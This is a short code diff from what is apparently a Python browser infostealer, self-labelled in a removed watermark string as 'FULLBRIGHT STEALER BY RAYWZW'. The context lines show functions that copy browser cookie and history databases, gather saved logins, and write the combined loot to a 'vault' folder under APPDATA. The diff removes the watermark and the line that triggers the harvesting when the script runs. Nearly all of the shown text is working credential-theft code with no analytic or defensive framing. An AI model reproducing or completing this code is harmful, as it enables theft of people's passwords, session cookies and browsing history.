@@ -95,8 +95,6 @@ def get_cookies(path: str, profile: str):
         os.remove(temp_path)
         return None    
     return result
-def add_watermark(content: str) -> str:
-    watermark = "\n------------FULLBRIGHT STEALER BY RAYWZW--------------\n"
 def random_filename(prefix):
     return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}"
 def convert_timestamp(timestamp):
@@ -120,7 +118,6 @@ def get_history(path: str, profile: str):
     conn.close()
     os.remove(temp_history_db)
     return result
-
 def save_results(logins, cookies, history):
     vault_dir = os.path.join(os.getenv('APPDATA'), 'vault')
     if not os.path.exists(vault_dir):
@@ -173,4 +170,3 @@ def getinfo():
                 if history_data:
                     combined_history += history_data
     save_results(combined_logins, combined_cookies, combined_history)
-getinfo()
